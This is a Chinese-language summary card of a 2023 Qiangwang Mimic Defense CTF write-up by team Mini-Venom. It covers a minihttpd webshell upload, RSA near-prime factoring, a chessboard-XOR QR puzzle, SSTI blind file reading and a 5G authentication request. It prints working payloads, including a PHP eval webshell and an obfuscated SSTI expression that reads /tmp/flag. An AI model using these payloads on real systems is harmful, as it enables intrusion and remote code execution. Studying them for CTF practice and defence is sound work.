---
title: "第六届\"强网\"拟态防御国际精英挑战赛 WriteUp By Mini-Venom"
category: web
tags: ["强网拟态防御", "web", "Web-PHP-remove_path", "minihttpd命令注入", "Crypto-RSA-next_prime爆破", "Misc-二维码国际象棋"]
signals: ["强网拟态防御 2023", "Web-PHP-remove_path", "minihttpd命令注入", "Crypto-RSA-next_prime爆破", "Misc-二维码国际象棋", "Mimic-SSTI盲注", "5G-AKA鉴权", "web_unknown", "ChaMd5", "Mini-Venom", "Web", "minihttpd", "remove_path", "create"]
difficulty: medium
source: "https://www.ctfiot.com/146224.html"
tools: ["PHP", "gmpy2"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 第六届"强网"拟态防御国际精英挑战赛 WriteUp By Mini-Venom

> 赛事：强网拟态防御 2023 | 方向：web | 难度：medium | 工具：PHP、gmpy2

## 一句话总结

第六届强网拟态防御ChaMd5 Mini-Venom WP,4题:Web(minihttpd remove_path+create/zip/unzip/clear)+Crypto(RSA next_prime近p爆破)+Misc(国际象棋棋盘+二维码XOR)+Mimic(SSTI字符逐位盲注+5G-AKA鉴权)

## 攻击链

1. Web-noumisotuitennnoka: minihttpd remove_path特性+create/zip/unzip/clear 4个action,创建/aa子目录+php webshell内容+zip+unzip到/var/www/html+clear删除.htaccess|一眼看出: 给n, c, a(近p,q)→for r in 0..2^6: p=next_prime(a-r), q=next_prime(next_prime(a)+r), if p*q==n: invert+pow|国际象棋与二维码: 500x500 49格棋盘图案 XOR attach.png → 二维码|用户登记系统: SSTI盲注 {{c.__init__.__globals__.__builtins__.open("".join(c.__init__.__globals__["__builtins__"].reversed("galf/pmt/"))).read()[i]}} for i in range(1000)字符逐位|用户鉴权: 5G核心网nudm-ueau/v1/suci-0-460-00-0-0-0-0123456001/security-information/generate-auth-data POST servingNetworkName=admin ausfInstanceId=admin → base64解码

## 关键 payload

```
?action=create&subdir=/aa&content=<?php eval($_POST[aaa]);&dev=/tmp//|for r in range(0,2**6): p = gmpy2.next_prime(a-r); q = gmpy2.next_prime(gmpy2.next_prime(a)+r); if(p*q==n): d=gmpy2.invert(65537,(p-1)*(q-1)); m=pow(c,d,n); print(long_to_bytes(m)); break|棋盘 500x500 49格 XOR attach.png|reversed("galf/pmt/")|POST /nudm-ueau/v1/suci-0-460-00-0-0-0-0123456001/security-information/generate-auth-data {servingNetworkName:admin, ausfInstanceId:admin}|flag{621f7c4f-21de-8566-649e-5a883ce318dc}
```

## 经验教训

1) minihttpd remove_path路径处理:create/zip/unzip/clear四种action加subdir+content+dev(/tmp//); 2) RSA近p爆破:已知近似a,for r in 0..2^6: p=next_prime(a-r),q=next_prime(next_prime(a)+r)验证p*q==n; 3) 棋盘+二维码XOR:生成500x500 49格棋盘图像与attach.png按位XOR得二维码; 4) SSTI字符逐位盲注:`{{c.__init__.__globals__.__builtins__.open("".join(reversed("galf/pmt/"))).read()[i]}}` 1000次循环逐字符读; 5) 5G-AKA鉴权:POST nudm-ueau/v1/suci-0-460-00-0-0-0-0123456001/security-information/generate-auth-data Body JSON servingNetworkName+ausfInstanceId

## 标签

Web-PHP-remove_path、minihttpd命令注入、Crypto-RSA-next_prime爆破、Misc-二维码国际象棋、Mimic-SSTI盲注、5G-AKA鉴权

## 参考来源

- https://www.ctfiot.com/146224.html
- 原文件：第六届“强网”拟态防御国际精英挑战赛_WriteUp_By_Mini-Venom.full.md
